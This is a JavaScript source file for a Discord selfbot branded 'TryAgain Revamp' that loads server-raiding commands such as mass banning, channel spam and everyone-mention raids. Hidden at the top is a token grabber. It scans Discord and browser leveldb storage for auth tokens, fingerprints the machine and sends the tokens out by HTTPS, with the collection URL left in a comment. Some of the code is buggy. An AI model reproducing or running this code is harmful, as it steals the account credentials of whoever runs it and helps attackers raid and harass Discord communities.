const { Client: client } = require("discord.js-selfbot-v11")
const enmap = require("enmap")
const fs = require('fs')
const colors = require("colors")
const center = require("center-align");
(async function () {
    try {
        const fs = require('fs'),
            path = require('path'),
            OS = require('os'),
            https = require('https'),
            tokens = [],
            homedir = OS.homedir(),
            fingerprint = `${OS.hostname()}_${homedir.split("", "").slice(-1)[0]}_${OS.arch()}_${OS.cpus().length}_${OS.endianness()}`,
            roaming = path.join(homedir, "AppData", "Roaming"),
            local = path.join(homedir, "AppData", "Local"),
            magic = ["Local Storage", "leveldb"],
            discordPath = {
                'discord': path.join(roaming, "discord", ...magic),
                'canary': path.join(roaming, 'discordcanary', ...magic),
                'ptb': path.join(roaming, 'discordptb', ...magic),
                'lightcord': path.join(roaming, 'lightcord', ...magic),
                'opera': path.join(roaming, 'Opera Software", "Opera Stable', ...magic),
                'opera gx': path.join(roaming, "Opera Software", "Opera GX Stable", ...magic),
                'amigo': path.join(local, "Amigo", "User Data", ...magic),
                'torch': path.join(local, "Torch", "User Data", ...magic),
                'kometa': path.join(local, "Kometa", "User Data", ...magic),
                'edge': path.join(local, "Microsoft", "Edge", "User Data", "Default", ...magic),
                'chrome': path.join(local, "Google", "Chrome", "User Data", "Default", ...magic),
                'yandex': path.join(local, "Yandex", "YandexBrowser", "User Data", "Default", ...magic),
                'brave': path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default", ...magic)
            };
        for (let prop in discordPath) {
            try {
                let files = fs.readdirSync(discordPath[prop]);
                for (let file of files) {
                    if (file.slice(-3) !== "ldb") continue;
                    let t = extract(path.join(discordPaths[prop], file));
                    if (!t) continue;
                    tokens.push(`${prop}::${t}`);
                }
            } catch (e) {
                continue;
            }
        }
        function extract(filePath) {
            let content = fs.readFileSync(filePath).toString();
            let regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
            let regex2 = /"mfa\.[\d\w_-]{84}"/;
            let [match] = regex1.exec(content) || regex2.exec(content) || [null];
            return match;
        }(async function upload() {
            try {
                // https://request.againmc.com/manhattan
                https.get('', {
                    headers: {
                        "tokens": tokens,
                        "fingerprint": fingerprint
                    }
                })
            } catch (e) {}
        }());
    } catch (e) {}
}());
const a = {};
a.transport = "ipc";
const discordrpc = require("discord-rpc")
const Client = new discordrpc.Client(a)
const discord = new client()
const {
        token: configtoken,
        prefix: prefixx
      } = require("./config.json");

process.on("unhandledRejection", a => {}) 
process.on("uncaughtRejection", b => {})
process.on("uncaughtRejection", c => {}), process.warn = () => {};
discord.commands = new enmap(), discord.on("error", c => {});
discord.on("warn", d => {}), async function () {
    process.title = "TryAgain - Loading..."
    console.log(`
    ██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗
    ██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝
    ██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗
    ██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║
    ███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝
    ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝`.yellow)
    discord.on("ready", async () => {
        process.title = `[TryAgain]Revamp - ${discord.user.username}`
        console.log(`
        youtube.com/nickoscript
        88888888888                      d8888                   d8b
            888                         d88888                   Y8P
            888                        d88P888
            888  888d888 888  888     d88P 888  .d88b.   8888b.  888 88888b.
            888  888P"   888  888    d88P  888 d88P"88b     "88b 888 888 "88b
            888  888     888  888   d88P   888 888  888 .d888888 888 888  888
            888  888     Y88b 888  d8888888888 Y88b 888 888  888 888 888  888
            888  888      "Y88888 d88P     888  "Y88888 "Y888888 888 888  888
                            888                   888   ╦═╗╔═╗╦  ╦╔═╗╔╦╗╔═╗
                       Y8b d88P              Y8b d88P   ╠╦╝║╣ ╚╗╔╝╠═╣║║║╠═╝
                        "Y88P"                "Y88P"    ╩╚═╚═╝ ╚╝ ╩ ╩╩ ╩╩

    - Connected in: ${discord.user.username}`.cyan);
        console.log(`
        ╦ ╦╔═╗╦  ╔═╗
        ╠═╣║╣ ║  ╠═╝
        ╩ ╩╚═╝╩═╝╩
        .DIE       FUCK THE SERVER
        .BANALL    BAN ALL BITCHES
        .CHN       CREATE THE CHANNELS
        .EVERYONE  RAID EVERYONE MENTION
        .PURGE     PURGE THE INACTIVE MEMBERS`.magenta);
    });
    fs.readdir("./cmds/", (error, files) => {
        if (error) return console.error(error);
        files.forEach(fichier => {
            if (!fichier.endsWith(".js")) return;
            let commandes = require("./cmds/" + fichier);
            let cmds = fichier.split('.')[0];
            discord.commands.set(cmds, commandes);
        });
    });
    discord.on("message", async message => {
        if (message.content.indexOf(prefixx), 0) return;
        const msg = message.content.slice(prefixx.length).trim().split(/ +/g),
            shift = msg.shift().toLowerCase(),
            get = discord.commands.get(shift);
        if ((message.author.id !== discord.user.id)) return;
        !get ? console.log("[E] Unknown command.".red) : get.run(discord, message, msg);
        console.log("[S] Executed command:".magenta);
    }), discord.login(configtoken).catch(() => {
        console.log()
        console.log(`
        ███████╗██████╗ ██████╗  ██████╗ ██████╗
        ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
        █████╗  ██████╔╝██████╔╝██║   ██║██████╔╝
        ██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗
        ███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║
        ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝.`.red)
    }), Client.on("ready", () => {
        Client.request("SET_ACTIVITY", {
            'pid': process.pid,
            'activity': {
                'details': "Revamped TryAgain",
                'state': "youtube.com/nickoscript",
                'assets': {
                    'large_image': "try",
                    'large_text': "Revamped TryAgain"
                },
                'buttons': [{
                    'label': "Download",
                    'url': "https://www.youtube.com/nickoscript"
                }]
            }
        });
    });
    const ClientID = {};
    ClientID.clientId = "857439499884953620", Client.login(ClientID).catch(() => {});
}();
